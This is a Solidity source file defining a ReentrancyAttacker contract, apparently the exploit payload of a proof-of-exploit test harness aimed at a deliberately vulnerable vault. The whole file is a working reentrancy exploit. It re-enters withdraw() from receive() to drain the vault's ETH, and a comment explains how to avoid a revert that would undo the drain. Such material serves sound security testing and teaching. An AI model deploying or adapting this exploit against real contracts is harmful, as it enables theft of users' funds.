// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/// @dev Minimal interface covering both VulnerableVault and
///      VulnerableVaultFixed — same ABI shape, only withdraw()'s internal
///      ordering differs.
interface IVault {
    function deposit() external payable;
    function withdraw() external;
    function balances(address) external view returns (uint256);
}

/// @title ReentrancyAttacker
/// @notice The exploit payload the Proof-of-Exploit harness runs against
///         `VulnerableVault`. Deposits once, then re-enters `withdraw()`
///         from `receive()` for as long as (a) the vault still shows a
///         nonzero tracked balance for this contract and (b) the vault
///         actually holds enough ETH to honor one more withdrawal of that
///         size.
///
/// @dev Condition (b) is what stops the attack cleanly instead of attempting
///      one withdrawal too many. Found the hard way while building the
///      spike this was ported from: a naive fixed-iteration-count reentry
///      attempts a withdrawal the vault can no longer pay. That low-level
///      `.call` fails, the vault's own `require(ok, ...)` reverts, and
///      because every nested `vault.withdraw()` call in the chain is a
///      normal (non-low-level) Solidity call, that revert propagates back
///      through EVERY frame's own `require(ok, ...)` check on its way out —
///      unwinding the ENTIRE transaction and erasing every earlier
///      successful drain in the same call stack, not just the failing hop.
///      Checking the vault's actual remaining balance before each reentry
///      avoids ever attempting the withdrawal that would trigger this.
contract ReentrancyAttacker {
    IVault public immutable vault;
    uint256 public reentryCount;
    uint256 public constant MAX_REENTRIES = 20; // safety valve only, not the real stop condition

    constructor(address _vault) {
        vault = IVault(_vault);
    }

    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    receive() external payable {
        uint256 owed = vault.balances(address(this));
        if (reentryCount < MAX_REENTRIES && owed > 0 && address(vault).balance >= owed) {
            reentryCount++;
            vault.withdraw();
        }
    }
}
